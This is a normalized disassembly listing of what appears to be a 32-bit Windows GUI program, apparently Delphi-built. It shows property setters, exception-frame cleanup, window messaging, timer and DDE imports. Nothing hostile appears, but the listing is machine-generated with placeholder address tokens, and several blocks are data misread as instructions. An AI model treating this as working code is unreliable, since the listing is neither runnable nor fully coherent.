jne r-xdata
mov al 0x1
retn
sub_44c589
jmp sub_403994
sub_44c590
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44c7d0
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44c7e0
sub_44c834
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_44c844
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_44c854
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_44c864
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_44c874
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_44c8ec
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_448c34
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_448c34
retn
sub_44c908
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_448c34
sub_44c950
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_44bba4
retn
mov eax edx
retn
j_sub_4036e0#6
jmp sub_4036e0
sub_44c98f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ccf5
jmp sub_403994
sub_44ccfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403258
retn
sub_44cd12
jmp sub_403994
sub_44ce13
jmp sub_403994
sub_44ce1a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ce37
mov eax [ ebp - 0x14 ]
call sub_403258
retn
sub_44ce30
jmp sub_403994
sub_44ce55
jmp sub_403994
sub_44cedf
jmp sub_403994
sub_44cee6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cf18
push ebx
mov ebx eax
mov eax ebx
call sub_4138f0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41a360
sub_44cfdc
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_44cff0
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_44cff8
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_44d3bd
jmp sub_403994
sub_44d3c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f30c
mov eax [ rw-data ]
retn
sub_44f314
mov [ rw-data ] eax
retn
sub_44f45c
jmp sub_4036e0
sub_44f493
jmp sub_403994
sub_44f49a
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f668
call sub_41a288
retn
sub_44f7aa
jmp sub_403994
sub_44f7b1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f855
jmp sub_403994
sub_44f85c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f8ec
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_450018
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4506c4
sub_450034
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_450018
sub_450154
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4506c4
sub_45016c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4506c4
sub_450184
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4506c4
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4501b0
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4501bc
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4506c4
retn
sub_45049c
push ebx
mov ebx edx
mov edx ebx
call sub_43c0b4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_45050c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_450634
jmp sub_403994
sub_45063b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450644
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44fa50
mov eax [ ebx + 0x20c ]
call sub_44fa50
sub_4506a4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4506b4
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4507af
jmp sub_403994
sub_4507bc
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4507d4
sub_4509f0
retn
sub_450a5e
jmp sub_403994
sub_450a9d
jmp sub_403994
sub_450ad0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43d5ac
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44fcdc
retn
sub_450af4
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43d5cc
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44fcdc
retn
sub_450be9
jmp sub_403994
sub_450bf0
mov eax [ ebp - 0x4 ]
call sub_43f52c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44f944
mov eax [ ebp - 0x4 ]
call sub_4506c4
sub_450d24
jmp sub_403994
sub_450d5c
jmp sub_403994
sub_450d63
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450d83
lea eax [ ebp - 0x114 ]
call sub_403f90
retn
sub_450d7c
jmp sub_403994
sub_450d83
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_45108a
jmp sub_403994
sub_451091
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035b4
sub_4510e5
jmp sub_4036e0
j_sub_4036e0#9
jmp sub_4036e0
sub_451166
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45151e
jmp sub_403994
sub_451525
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451600
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41752c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_451618
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_451650
mov edx eax
mov eax esi
call sub_418db4
pop esi
pop ebx
retn
sub_451634
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4529f4
mov edx eax
mov eax esi
call sub_418db4
pop esi
pop ebx
retn
sub_451650
push ebx
mov ebx eax
mov eax ebx
call sub_452694
mov edx r-xdata
call sub_41d2b4
pop ebx
retn
sub_451754
push ebx
mov ebx eax
mov eax ebx
call sub_451764
xor al 0x1
pop ebx
retn
sub_451764
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4517c0
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4517e0
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_451800
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_451af9
jmp sub_403994
sub_451b00
pop ecx
pop ebp
retn
sub_451b04
xor eax eax
retn
sub_451ddc
jmp sub_403994
sub_451de3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_451df9
jmp sub_403994
sub_451ee3
jmp sub_403994
sub_451eea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451f07
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_451f00
jmp sub_403994
sub_451f27
jmp sub_403994
sub_452212
jmp sub_403994
sub_4523a5
jmp sub_403994
sub_452694
mov eax [ eax + 0x238 ]
retn
sub_45269c
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4526a8
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4529e6
jmp sub_403994
sub_4529ed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4529f4
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_452a3c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_43c7c8
sub_452a58
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_452a94
push ebx
mov ebx eax
mov eax ebx
call sub_43e75c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41c9b0
sub_452b18
push ebx
mov ebx eax
mov eax ebx
call sub_43e784
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d358
sub_452b38
push ebx
mov ebx eax
mov eax ebx
call sub_452758
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_452820
pop ebx
retn
sub_453365
lea eax [ ebp - 0xb4 ]
call sub_403f90
retn
sub_453371
jmp sub_403994
j_sub_453365
jmp sub_453365
sub_453378
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4534d0
jmp sub_403994
sub_4534d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4537bc
jmp sub_403994
sub_4537c3
mov eax [ rw-data ]
call sub_456074
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4537da
add [ eax ] al
retn
sub_453a38
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_453a58
mov eax [ eax + 0x240 ]
call sub_4215dc
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_457e14
sub_453aff
jmp sub_403994
sub_453b06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b29
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d330
retn
sub_453b22
jmp sub_403994
sub_453b29
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453ce8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453a58
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_453f50
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44bd58
sub_45403b
jmp sub_403994
sub_454042
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454048
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_453830
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_4540a0
call sub_454dc8
retn
sub_4544ed
jmp sub_403994
sub_4544f4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4547f0
jmp sub_4036e0
j_sub_4036e0#5
jmp sub_4036e0
sub_454c85
jmp sub_403994
sub_454c8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454ca9
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
sub_454ca2
jmp sub_403994
sub_454ca9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454cb0
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_4215dc
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4516f8
sub_454cd0
call sub_403258
retn
sub_454d28
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_454d8e
jmp sub_403994
j_sub_4036e0#4
jmp sub_4036e0
sub_454f68
xor edx edx
call sub_451a5c
retn
sub_454f70
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_451a5c
mov eax ebx
call sub_438ca0
pop ebx
retn
sub_454ff6
jmp sub_403994
sub_454ffd
pop ebx
pop ecx
pop ebp
retn
sub_455004
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43f228
push eax
call PostMessageA
pop ebx
retn
sub_455208
jmp sub_403994
sub_4552a9
jmp sub_403994
sub_4552b3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552d2
mov eax [ rw-data ]
call sub_4574ec
retn
sub_4552cb
jmp sub_403994
sub_4552d2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552ef
lea eax [ ebp - 0x20 ]
call sub_403f90
retn
sub_4552e8
jmp sub_403994
sub_4552ef
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4553d0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_437e4c
retn
mov edx eax
mov eax [ rw-data ]
call sub_456b40
retn
sub_455754
mov edx eax
mov eax [ rw-data ]
call sub_458560
mov al 0x1
retn
sub_45583c
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_455764
sub_455850
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_455764
sub_455864
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_455764
sub_455878
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_455764
sub_45588c
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_4559f7
jmp sub_403994
sub_4559fe
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455a04
push ebx
mov ebx eax
mov eax ebx
call sub_43db40
mov eax ebx
call sub_43dcc4
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_455004
sub_455c7a
jmp sub_403994
sub_455c81
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455c88
push ebx
mov ebx edx
mov edx ebx
call sub_43dfa8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_437f54
pop ebx
retn
sub_455cdc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455d44
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_455cf4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455d44
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_455d10
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455d44
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_455d28
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_455d44
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_455fc4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455fd0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455fdc
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455fe8
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_455ff4
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_456000
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45600c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4137ac
pop esi
pop ebx
retn
sub_456020
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45603c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4137ac
pop esi
pop ebx
retn
sub_456050
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_456058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4137ac
pop esi
pop ebx
retn
sub_45606c
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_456148
mov eax [ eax + 0x54 ]
call sub_413650
retn
sub_456154
mov eax [ eax + 0x54 ]
call sub_4138f0
retn
sub_4563a7
jmp sub_403994
sub_4563eb
jmp sub_403994
sub_4563f2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_456440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456240
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403fe4
pop esi
pop ebx
retn
sub_4564ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4137ac
pop esi
pop ebx
retn
sub_4564c0
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4566c5
jmp sub_403994
sub_4566cc
pop ebx
mov esp ebp
pop ebp
retn
sub_4566d4
inc [ eax + 0x8c ]
retn
sub_4566dc
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_4566fc
sub_4566fc
xor edx edx
call sub_456b40
retn
sub_456b32
jmp sub_403994
sub_456bb9
jmp sub_403994
sub_456bc8
add eax 0x30
call sub_40cb64
retn
sub_456c0c
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4036e0#8
jmp sub_4036e0
sub_456c62
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_457331
jmp sub_403994
sub_457338
pop ebx
mov esp ebp
pop ebp
retn
sub_4574c0
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4574ec
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_457518
xor edx edx
call sub_457410
retn
sub_457520
mov dl 0x1
call sub_457410
retn
sub_457594
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4575ac
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_457679
jmp sub_403994
sub_457680
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036e0#3
jmp sub_4036e0
sub_4583c8
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4036e0#2
jmp sub_4036e0
j_sub_4036e0
jmp sub_4036e0
sub_45853e
jmp sub_403994
sub_458545
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45854c
call sub_40c6b4
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_458745
jmp sub_403994
sub_45874c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_458813
jmp sub_403994
sub_45881a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4589f0
jmp sub_403994
sub_4589f7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458a58
jmp sub_403994
sub_458a5f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458a68
call sub_458830
retn
sub_458c53
jmp sub_4036e0
sub_458cac
jmp sub_403994
sub_458cb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458de1
jmp sub_403994
sub_458f40
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45923f
jmp sub_403994
sub_45926e
jmp sub_403994
sub_45937a
jmp sub_403994
sub_459381
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459712
jmp sub_403994
sub_459719
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45975c
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_45988c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4598d7
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_4598e8
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4598f8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45996b
jmp sub_403994
sub_459972
pop ebp
retn
sub_459974
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_459908
call sub_403d64
call sub_45988c
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44f5e8
call sub_4132a0
sub_459b14
mov edx 0xafffd5ff
[ esi + 0x48ffadff ]
sub_45a153
inc ebx
add [ edx + ebp * 4 + 0x43 ] bh
add [ eax + 0x1 ] al
xor al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
push cs
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_45a575
jmp sub_403994
sub_45a57c
pop ecx
pop ebp
retn
sub_45a580
and eax 0xff
shl eax 0x10
and edx 0xff
or eax edx
retn
sub_45a594
shr eax 0x10
retn
sub_45a598
and eax 0xff
retn
sub_45a5a0
xor eax eax
retn
sub_45a70c
push ebx
mov ebx edx
mov edx ebx
call sub_4318f4
test [ ebx + 0x4 ] 0x30
jne r-xdata
pop ebx
retn
or [ ebx + 0x4 ] 0x10
sub_45a730
push ebx
mov ebx eax
mov eax ebx
call sub_43e784
mov eax ebx
call sub_45a744
pop ebx
retn
sub_45a926
jmp sub_403994
sub_45ae80
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45af44
call sub_43100c
retn
sub_45af4c
call sub_43102c
retn
sub_45af7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45aee8
test eax eax
setne al
pop esi
pop ebx
retn
sub_45b034
cmp dl [ eax + 0x281 ]
je r-xdata
retn
mov [ eax + 0x281 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45b0b0
cmp edx [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45b0c4
cmp edx [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45b0fd
jmp sub_403994
sub_45b104
pop ebp
retn
sub_45b108
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_45a4fc
mciGetErrorStringA
jmp [ __import_lookup_table_14(winmm:mciGetErrorStringA) ]
sub_45b165
jmp sub_403994
sub_45b16c
pop ebp
retn
sub_45b170
sub [ rw-data ] 0x1
retn
sub_45b472
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0xb4
rol [ ebx ] 0xb0
retn
sub_45ba7c
push ebx
mov ebx eax
mov eax ebx
call sub_43aafc
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x31d ] 0x0
je r-xdata
mov eax ebx
call sub_45c980
sub_45bc48
cmp dl [ eax + 0x31c ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x31c ] cl
test cl cl
je r-xdata
mov dx [ eax + 0x2a2 ]
call sub_45bc70
call sub_45bcb4
jmp r-xdata
sub_45c4f4
movsx ecx [ edx + 0xa ]
movsx edx [ edx + 0x8 ]
call sub_45c414
retn
sub_45c504
movsx ecx [ edx + 0xa ]
movsx edx [ edx + 0x8 ]
call sub_45c414
retn
sub_45c63c
push esi
mov dl [ eax + 0x2aa ]
mov si 0xffb1
call sub_403454
pop esi
retn
sub_45c6d4
mov edx [ eax ]
call [ edx + 0xc8 ]
retn
sub_45c6e0
mov edx [ eax ]
call [ edx + 0xc8 ]
retn
sub_45c6ec
mov [ edx + 0xc ] 0x1
retn
sub_45c874
cmp [ eax + 0x2e1 ] 0x0
jne r-xdata
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
sub_45c898
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_45c8b8
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_45c8d8
push ebx
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_45c8f8
push ebx
mov ebx eax
mov eax ebx
call sub_419590
mov eax ebx
call sub_45bdc4
pop ebx
retn
sub_45cbde
jmp sub_403994
sub_45cbe5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d6c8
cmp edx [ eax + 0x2fc ]
je r-xdata
mov [ eax + 0x2f0 ] 0x1
retn
mov [ eax + 0x2fc ] edx
sub_45d6e0
cmp dl [ eax + 0x2f4 ]
je r-xdata
retn
mov [ eax + 0x2f4 ] dl
sub_45dbf9
jmp sub_403994
sub_45dc00
pop ebp
retn
sub_45dc04
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ __import_lookup_table_15(user32:DdeInitializeA) ]
DdeUninitialize
jmp [ DdeUninitialize@IAT ]
DdeConnect
jmp [ __import_lookup_table_15(user32:DdeConnect) ]
